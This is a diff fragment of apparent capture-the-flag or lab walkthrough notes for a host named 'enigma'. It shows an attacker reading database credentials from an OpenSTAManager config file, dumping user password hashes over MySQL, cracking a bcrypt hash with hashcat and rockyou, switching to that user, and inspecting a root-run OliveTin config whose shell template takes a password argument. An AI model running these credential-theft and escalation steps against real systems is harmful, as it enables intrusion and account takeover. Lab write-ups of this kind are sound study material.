@@ -138,3 +138,48 @@ Files with capabilities (limited to 50):
    145247      4 -rw-------   1 it       mail         2485 Feb 18 21:42 /var/spool/mail/it
    145246      4 -rw-------   1 sarah    mail         1447 Feb 18 21:42 /var/spool/mail/sarah
 
+cat /var/www/html/openstamanager/config.inc.php
+
+$db_host = 'localhost';
+$db_username = 'brollin';
+$db_password = 'Fri3nds@9099';
+$db_name = 'openstamanager';
+// $port = '|port|';
+$db_options = [
+
+mysql -u brollin -pFri3nds@9099 -h localhost openstamanager \
+  -B -e "SELECT username, password FROM zz_users;"
+
+haris 	$2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC
+
+hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
+ bestfriends
+
+su haris
+id
+# uid=1001(haris) gid=1001(haris) groups=1001(haris)
+
+haris@enigma:~$ ps -auxf | grep root
+
+root        1527  0.0  0.4 1238992 16100 ?       Ssl  08:33   0:00 /usr/local/bin/OliveTin
+
+haris@enigma:/etc/OliveTin$ cat config.yaml 
+
+# Docs: https://docs.olivetin.app/entities/intro.html
+  - title: Backup Database
+    id: backup_database
+    icon: "⛁"
+    shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
+    popupOnStart: execution-dialog
+    arguments:
+      - name: db_user
+        type: ascii_identifier
+        default: backup_svc
+      - name: db_pass
+        type: password
+      - name: db_name
+        type: ascii_identifier
+        default: production
+
+
+
